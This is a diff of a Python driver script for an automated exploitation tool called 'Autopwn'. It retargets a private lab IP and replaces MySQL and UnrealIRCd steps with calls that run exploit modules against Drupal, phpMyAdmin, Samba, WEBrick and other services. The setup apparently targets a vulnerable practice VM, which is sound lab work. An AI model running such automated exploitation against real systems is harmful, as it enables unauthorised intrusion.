@@ -5,23 +5,21 @@ from pprint import pprint
 
 import logging
 log = logging.getLogger("Autopwn").setLevel(logging.DEBUG)
-log = logging.getLogger("paramiko").setLevel(logging.WARNING)
-log = logging.getLogger("urllib3").setLevel(logging.WARNING)
+url = logging.getLogger("urllib3")
+url.setLevel(logging.WARNING)
+smblog = logging.getLogger("SMB")
+smblog.setLevel(logging.WARNING)
+logging.basicConfig(level=logging.DEBUG)
 
 
 pwn = Autopwn()
 
-#tar = "192.168.13.152"
-tar = "192.168.56.3"
+tar = "192.168.56.4"
 
-# MySQL
-pprint(pwn.mysql.msfcore())
-print("Service Name: {}".format(pwn.mysql.name))
-#pprint(pwn.mysql.search())
-pprint(pwn.mysql.search("mysql"))
-
-#pwn.scoreHost(tar)
-pwn.unreal.exploitall(tar)
-pprint(pwn.unreal.sessions())
-
-
+pwn.chat.run(tar)
+pwn.drupal.run(tar)
+pwn.payroll.run(tar)
+pwn.phpmyadmin.run(tar)
+#pwn.proftpd.run(tar) # What's happenin?
+pwn.samba.run(tar)
+pwn.webrick.run(tar)
